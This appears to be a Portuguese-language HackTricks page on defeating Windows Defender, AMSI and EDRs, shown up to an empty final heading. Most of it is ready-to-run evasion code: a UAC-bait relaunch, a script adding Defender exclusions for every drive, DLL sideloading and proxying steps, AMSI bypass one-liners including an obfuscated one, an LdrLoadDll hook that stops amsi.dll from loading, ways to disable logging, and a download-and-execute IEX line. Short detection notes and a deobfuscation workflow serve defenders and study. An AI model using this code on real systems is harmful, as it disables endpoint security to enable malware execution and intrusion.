# Bypass de Antivirus (AV)

{{#include ../banners/hacktricks-training.md}}

**Esta página foi escrita inicialmente por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Parar o Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uma ferramenta para impedir o funcionamento do Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Uma ferramenta para impedir o funcionamento do Windows Defender, fingindo ser outro AV.
- [Desabilitar o Defender se você for admin](basic-powershell-for-pentesters/README.md)

### Isca de UAC no estilo de instalador antes de adulterar o Defender

Loaders públicos disfarçados de cheats de jogos frequentemente são distribuídos como instaladores Node.js/Nexe não assinados que primeiro **pedem elevação ao usuário** e só então neutralizam o Defender. O fluxo é simples:

1. Verificar o contexto administrativo com `net session`. O comando só é bem-sucedido quando o chamador possui direitos de admin, portanto, uma falha indica que o loader está sendo executado como usuário padrão.
2. Reiniciar imediatamente a si mesmo com o verbo `RunAs` para acionar o prompt de consentimento UAC esperado, preservando a linha de comando original.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
As vítimas já acreditam que estão instalando software “cracked”, então o prompt geralmente é aceito, concedendo ao malware as permissões necessárias para alterar a política do Defender.<sup>[[26]](#references)</sup>

### Exclusões abrangentes de `MpPreference` para todas as letras de unidade

Uma vez elevado, chains no estilo GachiLoader maximizam os pontos cegos do Defender em vez de desativar o serviço diretamente. O loader primeiro encerra o watchdog da GUI (`taskkill /F /IM SecHealthUI.exe`) e, em seguida, aplica **exclusões extremamente abrangentes**, fazendo com que todo perfil de usuário, diretório do sistema e disco removível se torne impossível de verificar:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Observações principais:

- O loop percorre todos os sistemas de arquivos montados (D:\, E:\, dispositivos USB etc.), portanto **qualquer payload futuro colocado em qualquer local do disco será ignorado**.
- A exclusão da extensão `.sys` é preventiva: os atacantes mantêm a opção de carregar drivers não assinados posteriormente sem precisar modificar o Defender novamente.
- Todas as alterações ficam em `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, permitindo que os estágios posteriores confirmem se as exclusões persistem ou as ampliem sem acionar o UAC novamente.

Como nenhum serviço do Defender é interrompido, verificações de integridade ingênuas continuam informando “antivírus ativo”, embora a inspeção em tempo real nunca acesse esses caminhos.<sup>[[26]](#references)</sup>

## **Metodologia de Evasão de AV**

Atualmente, os AVs usam métodos diferentes para verificar se um arquivo é malicioso ou não: detecção estática, análise dinâmica e, nos EDRs mais avançados, análise comportamental.

### **Detecção estática**

A detecção estática é realizada sinalizando strings maliciosas conhecidas ou arrays de bytes em um binário ou script, além de extrair informações do próprio arquivo (por exemplo, descrição do arquivo, nome da empresa, assinaturas digitais, ícone, checksum etc.). Isso significa que usar ferramentas públicas conhecidas pode fazer com que você seja detectado mais facilmente, pois elas provavelmente já foram analisadas e sinalizadas como maliciosas. Existem algumas maneiras de contornar esse tipo de detecção:

- **Criptografia**

Se você criptografar o binário, não haverá como o AV detectar seu programa, mas será necessário algum tipo de loader para descriptografar e executar o programa na memória.

- **Obfuscation**

Às vezes, basta alterar algumas strings no seu binário ou script para fazê-lo passar pelo AV, mas isso pode ser uma tarefa demorada, dependendo do que você está tentando ofuscar.

- **Custom tooling**

Se você desenvolver suas próprias ferramentas, não haverá assinaturas maliciosas conhecidas, mas isso exige muito tempo e esforço.

> [!TIP]
> Uma boa forma de verificar a detecção estática do Windows Defender é usando o [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Basicamente, ele divide o arquivo em vários segmentos e solicita ao Defender que verifique cada um individualmente; assim, pode informar exatamente quais strings ou bytes foram sinalizados no seu binário.

Recomendo bastante que você confira esta [playlist do YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre Evasão de AV prática.

### **Análise dinâmica**

A análise dinâmica ocorre quando o AV executa seu binário em uma sandbox e observa atividades maliciosas (por exemplo, tentar descriptografar e ler as senhas do seu navegador, realizar um minidump no LSASS etc.). Essa parte pode ser um pouco mais difícil, mas há algumas coisas que você pode fazer para evitar sandboxes.

- **Sleep antes da execução** Dependendo de como é implementado, esse pode ser um ótimo método para contornar a análise dinâmica do AV. Os AVs têm pouquíssimo tempo para verificar os arquivos sem interromper o fluxo de trabalho do usuário, portanto, usar sleeps longos pode atrapalhar a análise dos binários. O problema é que muitas sandboxes de AV podem simplesmente ignorar o sleep, dependendo de como ele é implementado.
- **Verificação dos recursos da máquina** Normalmente, as Sandboxes têm pouquíssimos recursos disponíveis (por exemplo, < 2GB de RAM); caso contrário, poderiam deixar a máquina do usuário mais lenta. Você também pode ser bastante criativo aqui, verificando, por exemplo, a temperatura da CPU ou até mesmo a velocidade das ventoinhas; nem tudo será implementado na sandbox.
- **Verificações específicas da máquina** Se você quiser atingir um usuário cuja workstation esteja ingressada no domínio "contoso.local", poderá verificar o domínio do computador para confirmar se corresponde ao especificado; caso não corresponda, você pode fazer o programa sair.

Acontece que o computername da Sandbox do Microsoft Defender é HAL9TH. Portanto, você pode verificar o nome do computador no seu malware antes da detonação; se o nome for HAL9TH, significa que você está dentro da sandbox do Defender, e então poderá fazer o programa sair.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Algumas outras dicas realmente boas de [@mgeeky](https://twitter.com/mariuszbit) para lidar com Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p>canal #malware-dev do <a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a></p></figcaption></figure>

Como dissemos anteriormente neste post, **ferramentas públicas** acabarão sendo **detectadas**, portanto, você deve se perguntar:

Por exemplo, se você quiser realizar um dump do LSASS, **você realmente precisa usar o mimikatz**? Ou poderia usar um projeto diferente, menos conhecido e que também faça dump do LSASS?

A resposta correta provavelmente é a segunda opção. Tomando o mimikatz como exemplo, ele provavelmente é uma das, senão a mais sinalizada, peças de malware pelos AVs e EDRs. Embora o projeto em si seja muito bom, também é um pesadelo trabalhar com ele para contornar AVs; portanto, procure alternativas para o que você está tentando alcançar.

> [!TIP]
> Ao modificar seus payloads para evasão, certifique-se de **desativar o envio automático de amostras** no Defender e, por favor, falando sério, **NÃO FAÇA UPLOAD PARA O VIRUSTOTAL** se seu objetivo for obter evasão a longo prazo. Se quiser verificar se seu payload é detectado por um AV específico, instale-o em uma VM, tente desativar o envio automático de amostras e faça os testes nela até ficar satisfeito com o resultado.

## EXEs vs DLLs

Sempre que possível, **priorize o uso de DLLs para evasão**. Na minha experiência, arquivos DLL geralmente são **muito menos detectados** e analisados, portanto, esse é um truque muito simples para evitar a detecção em alguns casos (se o seu payload tiver alguma forma de ser executado como uma DLL, é claro).

Como podemos ver nesta imagem, um Payload DLL do Havoc tem uma taxa de detecção de 4/26 no antiscan.me, enquanto o payload EXE tem uma taxa de detecção de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparação do antiscan.me entre um payload EXE normal do Havoc e uma DLL normal do Havoc</p></figcaption></figure>

Agora mostraremos alguns truques que você pode usar com arquivos DLL para obter muito mais stealth.

## DLL Sideloading & Proxying

**DLL Sideloading** aproveita a ordem de pesquisa de DLL usada pelo loader, posicionando o aplicativo vítima e o(s) payload(s) malicioso(s) lado a lado.

Você pode verificar quais programas são suscetíveis a DLL Sideloading usando o [Siofra](https://github.com/Cybereason/siofra) e o seguinte script powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Este comando exibirá a lista de programas suscetíveis a DLL hijacking dentro de "C:\Program Files\\" e os arquivos DLL que eles tentam carregar.

Recomendo fortemente que você **explore programas DLL Hijackable/Sideloadable por conta própria**; essa técnica é bastante furtiva quando executada corretamente, mas, se você usar programas DLL Sideloadable conhecidos publicamente, poderá ser detectado facilmente.

Apenas colocar uma DLL maliciosa com o nome que um programa espera carregar não executará seu payload, pois o programa espera encontrar funções específicas dentro dessa DLL. Para corrigir esse problema, usaremos outra técnica chamada **DLL Proxying/Forwarding**.

**DLL Proxying** encaminha as chamadas que um programa faz da DLL proxy (e maliciosa) para a DLL original, preservando assim a funcionalidade do programa e permitindo lidar com a execução do seu payload.

Usarei o projeto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Estas são as etapas que segui:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
O último comando nos dará 2 arquivos: um template de código-fonte de DLL e a DLL original renomeada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Estes são os resultados:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Tanto nosso shellcode (encoded com [SGN](https://github.com/EgeBalci/sgn)) quanto a proxy DLL tiveram uma taxa de Detection de 0/26 no [antiscan.me](https://antiscan.me)! Eu diria que isso foi um sucesso.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Eu **recomendo fortemente** que você assista ao [VOD da Twitch de S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading e também ao [vídeo do ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) para aprender mais sobre o que discutimos em maior profundidade.

### Abusing Forwarded Exports (ForwardSideLoading)

Os módulos PE do Windows podem exportar funções que são, na verdade, "forwarders": em vez de apontarem para um código, a entrada de exportação contém uma string ASCII no formato `TargetDll.TargetFunc`. Quando um caller resolve a exportação, o loader do Windows irá:

- Carregar `TargetDll` caso ainda não esteja carregada
- Resolver `TargetFunc` a partir dela

Comportamentos importantes a entender:
- Se `TargetDll` for uma KnownDLL, ela será fornecida a partir do namespace protegido KnownDLLs (por exemplo, ntdll, kernelbase, ole32).<sup>[[15]](#references)</sup>
- Se `TargetDll` não for uma KnownDLL, a ordem normal de busca de DLLs será usada, incluindo o diretório do módulo que está realizando a resolução do forward.

Isso permite uma primitive de sideloading indireto: encontrar uma DLL assinada que exporte uma função encaminhada para um nome de módulo que não seja uma KnownDLL e, em seguida, colocar essa DLL assinada no mesmo diretório que uma DLL controlada pelo attacker, nomeada exatamente como o módulo-alvo encaminhado. Quando a exportação encaminhada for invocada, o loader resolverá o forward e carregará sua DLL a partir do mesmo diretório, executando sua DllMain.<sup>[[13]](#references)</sup>

Exemplo observado no Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` não é uma KnownDLL, portanto é resolvida por meio da ordem de pesquisa normal.

PoC (copiar e colar):
1) Copie a DLL do sistema assinada para uma pasta com permissão de escrita
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Coloque uma `NCRYPTPROV.dll` maliciosa na mesma pasta. Um DllMain mínimo é suficiente para obter execução de código; você não precisa implementar a função encaminhada para acionar o DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Acione o encaminhamento com um LOLBin assinado:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportamento observado:
- rundll32 (signed) carrega a `keyiso.dll` side-by-side (signed)
- Ao resolver `KeyIsoSetAuditingInterface`, o loader segue o forward para `NCRYPTPROV.SetAuditingInterface`
- O loader então carrega `NCRYPTPROV.dll` de `C:\test` e executa sua `DllMain`
- Se `SetAuditingInterface` não estiver implementada, você receberá um erro de "missing API" somente depois que `DllMain` já tiver sido executada

Dicas para hunting:
- Concentre-se em forwarded exports cujo módulo de destino não seja uma KnownDLL. As KnownDLLs estão listadas em `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Você pode enumerar forwarded exports com ferramentas como:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Consulte o inventário de forwarders do Windows 11 para procurar candidatos: https://hexacorn.com/d/apis_fwd.txt<sup>[[14]](#references)</sup>

Ideias de detecção/defesa:
- Monitore LOLBins (por exemplo, rundll32.exe) carregando DLLs assinadas de caminhos que não sejam do sistema, seguidas pelo carregamento de KnownDLLs com o mesmo nome base a partir desse diretório
- Gere alertas para cadeias de processos/módulos como: `rundll32.exe` → `keyiso.dll` que não seja do sistema → `NCRYPTPROV.dll` em caminhos graváveis pelo usuário
- Imponha políticas de integridade de código (WDAC/AppLocker) e negue escrita+execução em diretórios de aplicativos

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Você pode usar o Freeze para carregar e executar seu shellcode de maneira furtiva.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion é apenas um jogo de gato e rato: o que funciona hoje pode ser detectado amanhã, portanto nunca dependa de apenas uma ferramenta; se possível, tente encadear múltiplas técnicas de evasion.

## Syscalls Diretas/Indiretas e Resolução de SSN (SysWhispers4)

Os EDRs frequentemente colocam **hooks inline em user-mode** nos stubs de syscall da `ntdll.dll`. Para contornar esses hooks, você pode gerar stubs de syscall **diretos** ou **indiretos** que carregam o **SSN** (System Service Number) correto e fazem a transição para kernel mode sem executar o entrypoint exportado que possui o hook.<sup>[[32]](#references)</sup>

**Opções de invocação:**
- **Direct (embedded)**: emite uma instrução `syscall`/`sysenter`/`SVC #0` no stub gerado (sem atingir uma exportação da `ntdll`).
- **Indirect**: salta para um gadget `syscall` existente dentro da `ntdll`, fazendo com que a transição para o kernel pareça originar-se da `ntdll` (útil para evasion de heurísticas); **randomized indirect** escolhe um gadget de um pool a cada chamada.
- **Egg-hunt**: evita incorporar a sequência de opcode estática `0F 05` no disco; resolve uma sequência de syscall em runtime.

**Estratégias de resolução de SSN resistentes a hooks:**
- **FreshyCalls (VA sort)**: infere os SSNs ordenando os stubs de syscall por endereço virtual, em vez de ler os bytes dos stubs.
- **SyscallsFromDisk**: mapeia uma `\KnownDlls\ntdll.dll` limpa, lê os SSNs de seu `.text` e, em seguida, desfaz o mapeamento (contorna todos os hooks em memória).
- **RecycledGate**: combina a inferência de SSN ordenada por VA com a validação de opcode quando um stub está limpo; usa a inferência por VA como fallback quando há um hook.
- **HW Breakpoint**: define DR0 na instrução `syscall` e usa um VEH para capturar o SSN de `EAX` em runtime, sem analisar bytes que possuem hooks.

Exemplo de uso do SysWhispers4:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI foi criado para impedir "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, os AVs só eram capazes de escanear **arquivos no disco**, portanto, se você conseguisse executar payloads **diretamente na memória**, o AV não poderia fazer nada para impedir isso, pois não tinha visibilidade suficiente.

O recurso AMSI está integrado a estes componentes do Windows.

- User Account Control, ou UAC (elevação de EXE, COM, MSI ou instalação de ActiveX)
- PowerShell (scripts, uso interativo e avaliação dinâmica de código)
- Windows Script Host (wscript.exe e cscript.exe)
- JavaScript e VBScript
- Macros VBA do Office

Ele permite que soluções antivírus inspecionem o comportamento dos scripts, expondo o conteúdo dos scripts em um formato não criptografado e não ofuscado.

Executar `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produzirá o alerta a seguir no Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Observe como ele adiciona `amsi:` e, em seguida, o caminho para o executável a partir do qual o script foi executado; neste caso, powershell.exe

Não gravamos nenhum arquivo no disco, mas ainda assim fomos detectados na memória por causa do AMSI.

Além disso, a partir do **.NET 4.8**, o código C# também passa pelo AMSI. Isso afeta até mesmo `Assembly.Load(byte[])` para carregar execução na memória. É por isso que usar versões inferiores do .NET (como 4.7.2 ou anteriores) é recomendado para execução na memória, caso você queira evadir o AMSI.

Há algumas maneiras de contornar o AMSI:

- **Obfuscation**

Como o AMSI trabalha principalmente com detecções estáticas, modificar os scripts que você tenta carregar pode ser uma boa maneira de evitar a detecção.

No entanto, o AMSI é capaz de desofuscar scripts, mesmo que eles tenham várias camadas, portanto, a obfuscation pode ser uma opção ruim, dependendo de como é feita. Isso faz com que a evasão não seja tão simples. Embora, às vezes, tudo o que você precise fazer seja alterar alguns nomes de variáveis e tudo funcionará, então isso depende do quanto algo foi sinalizado.

- **AMSI Bypass**

Como o AMSI é implementado carregando uma DLL no processo do powershell (assim como cscript.exe, wscript.exe etc.), é possível adulterá-lo facilmente, mesmo sendo executado como um usuário sem privilégios. Devido a essa falha na implementação do AMSI, pesquisadores encontraram várias maneiras de evadir o scanning do AMSI.

**Forcing an Error**

Forçar a inicialização do AMSI a falhar (amsiInitFailed) fará com que nenhum scan seja iniciado para o processo atual. Isso foi originalmente divulgado por [Matt Graeber](https://twitter.com/mattifestation), e a Microsoft desenvolveu uma signature para impedir um uso mais amplo.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Bastou uma linha de código powershell para tornar o AMSI inutilizável no processo powershell atual. É claro que essa linha foi identificada pelo próprio AMSI, portanto, é necessário fazer alguma modificação para usar esta técnica.

Aqui está um bypass de AMSI modificado que obtive deste [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Tenha em mente que isso provavelmente será sinalizado assim que esta publicação sair, portanto você não deve publicar nenhum código se o seu plano for permanecer indetectado.

**Memory Patching**

Essa técnica foi descoberta inicialmente por [@RastaMouse](https://twitter.com/_RastaMouse/) e envolve encontrar o endereço da função "AmsiScanBuffer" em amsi.dll (responsável por escanear a entrada fornecida pelo usuário) e sobrescrevê-lo com instruções para retornar o código de E_INVALIDARG. Dessa forma, o resultado do scan real retornará 0, que é interpretado como um resultado limpo.

> [!TIP]
> Leia [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para obter uma explicação mais detalhada.

Também existem muitas outras técnicas usadas para realizar bypass do AMSI com powershell. Confira [**esta página**](basic-powershell-for-pentesters/index.html#amsi-bypass) e [**este repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para saber mais sobre elas.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

O AMSI é inicializado somente depois que `amsi.dll` é carregada no processo atual. Um bypass robusto e independente de linguagem consiste em colocar um hook em modo de usuário sobre `ntdll!LdrLoadDll` que retorne um erro quando o módulo solicitado for `amsi.dll`. Como resultado, o AMSI nunca é carregado e nenhum scan ocorre nesse processo.<sup>[[23]](#references)</sup>

Visão geral da implementação (pseudocódigo x64 C/C++):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notas
- Funciona em PowerShell, WScript/CScript e custom loaders (qualquer coisa que, de outra forma, carregaria o AMSI).
- Combine com o envio de scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) para evitar artefatos longos na linha de comando.
- Já foi usado por loaders executados por meio de LOLBins (por exemplo, `regsvr32` chamando `DllRegisterServer`).

A ferramenta **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** também gera scripts para bypass do AMSI.
A ferramenta **[https://amsibypass.com/](https://amsibypass.com/)** também gera scripts para bypass do AMSI que evitam assinaturas usando funções e variáveis definidas pelo usuário, expressões de caracteres randomizadas e aplicando capitalização aleatória aos comandos do PowerShell para evitar assinaturas.

**Remova a assinatura detectada**

Você pode usar uma ferramenta como **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** para remover a assinatura do AMSI detectada da memória do processo atual. Essa ferramenta funciona escaneando a memória do processo atual em busca da assinatura do AMSI e, em seguida, sobrescrevendo-a com instruções NOP, removendo-a efetivamente da memória.

**Produtos AV/EDR que usam AMSI**

Você pode encontrar uma lista de produtos AV/EDR que usam AMSI em **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use a versão 2 do PowerShell**
Se você usar a versão 2 do PowerShell, o AMSI não será carregado, permitindo executar seus scripts sem que sejam escaneados pelo AMSI. Você pode fazer isso:
```bash
powershell.exe -version 2
```
## Logging do PS

O logging do PowerShell é um recurso que permite registrar todos os comandos do PowerShell executados em um sistema. Isso pode ser útil para fins de auditoria e solução de problemas, mas também pode ser um **problema para atacantes que desejam evitar a detecção**.

Para ignorar o logging do PowerShell, você pode usar as seguintes técnicas:

- **Desabilitar PowerShell Transcription e Module Logging**: você pode usar uma ferramenta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para essa finalidade.
- **Usar a versão 2 do Powershell**: se você usar a versão 2 do PowerShell, o AMSI não será carregado, permitindo executar seus scripts sem que sejam verificados pelo AMSI. Você pode fazer isso com: `powershell.exe -version 2`
- **Usar uma sessão de PowerShell não gerenciada**: use [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para hospedar o PowerShell sem iniciar `powershell.exe` (a abordagem usada pelo `powerpick` do Cobalt Strike). Isso ignora controles vinculados especificamente ao processo `powershell.exe`, mas não desabilita inerentemente o AMSI, o Script Block Logging ou todas as outras defesas do PowerShell; a cobertura depende do runtime e da implementação do host.


## Ofuscação

> [!TIP]
> Várias técnicas de ofuscação dependem da criptografia de dados, o que aumentará a entropia do binário e facilitará sua detecção por AVs e EDRs. Tenha cuidado com isso e talvez aplique a criptografia apenas a seções específicas do seu código que sejam sensíveis ou precisem ser ocultadas.

### Desofuscando binários .NET protegidos pelo ConfuserEx

Ao analisar malware que usa o ConfuserEx 2 (ou forks comerciais), é comum encontrar várias camadas de proteção que bloquearão decompiladores e sandboxes. O workflow abaixo **restaura um IL quase original** que posteriormente pode ser decompilado para C# em ferramentas como dnSpy ou ILSpy.<sup>[[10]](#references)</sup>

1. Remoção do anti-tampering – o ConfuserEx criptografa cada *method body* e o descriptografa dentro do construtor estático (`<Module>.cctor`) do *module*. Isso também altera o checksum do PE, portanto qualquer modificação fará o binário travar. Use o **AntiTamperKiller** para localizar as tabelas de metadados criptografadas, recuperar as chaves XOR e reescrever uma assembly limpa:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
A saída contém os 6 parâmetros de anti-tamper (`key0-key3`, `nameHash`, `internKey`), que podem ser úteis ao criar seu próprio unpacker.

2. Recuperação de símbolos / fluxo de controle – forneça o arquivo *clean* ao **de4dot-cex** (um fork do de4dot compatível com o ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – seleciona o perfil do ConfuserEx 2
• o de4dot desfará o flattening do fluxo de controle, restaurará os namespaces, classes e nomes de variáveis originais e descriptografará as strings constantes.

3. Remoção de proxy calls – o ConfuserEx substitui chamadas diretas de métodos por wrappers leves (também chamados de *proxy calls*) para dificultar ainda mais a decompilação. Remova-os com o **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Após esta etapa, você deverá observar APIs .NET normais, como `Convert.FromBase64String` ou `AES.Create()`, em vez de funções wrapper opacas (`Class8.smethod_10`, …).

4. Limpeza manual – execute o binário resultante no dnSpy e procure grandes blobs Base64 ou o uso de `RijndaelManaged`/`TripleDESCryptoServiceProvider` para localizar o payload *real*. Frequentemente, o malware o armazena como um array de bytes codificado em TLV, inicializado dentro de `<Module>.byte_0`.

A cadeia acima restaura o fluxo de execução **sem precisar executar a amostra maliciosa** – útil ao trabalhar em uma workstation offline.

> 🛈  O ConfuserEx produz um atributo customizado chamado `ConfusedByAttribute`, que pode ser usado como um IOC para fazer a triagem automática de amostras.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: ofuscador de C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): O objetivo deste projeto é fornecer um fork open-source do conjunto de compilação [LLVM](http://www.llvm.org/) capaz de oferecer maior segurança de software por meio de [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e proteção contra adulteração.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstra como usar a linguagem `C++11/14` para gerar, em tempo de compilação, código ofuscado sem usar qualquer ferramenta externa e sem modificar o compilador.
- [**obfy**](https://github.com/fritzone/obfy): Adiciona uma camada de operações ofuscadas geradas pelo framework de metaprogramação de templates do C++, o que tornará a vida da pessoa que deseja crackear a aplicação um pouco mais difícil.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz é um ofuscador de binários x64 capaz de ofuscar diversos pe files, incluindo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame é um mecanismo simples de código metamórfico para executáveis arbitrários.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator é um framework de ofuscação de código refinada para linguagens compatíveis com LLVM usando ROP (return-oriented programming). O ROPfuscator ofusca um programa no nível do código assembly, transformando instruções regulares em cadeias ROP, frustrando nossa concepção natural do fluxo de controle normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt é um .NET PE Crypter escrito em Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor é capaz de converter EXE/DLL existentes em shellcode e então carregá-los

### Self-masking por função assistido pelo compilador LLVM

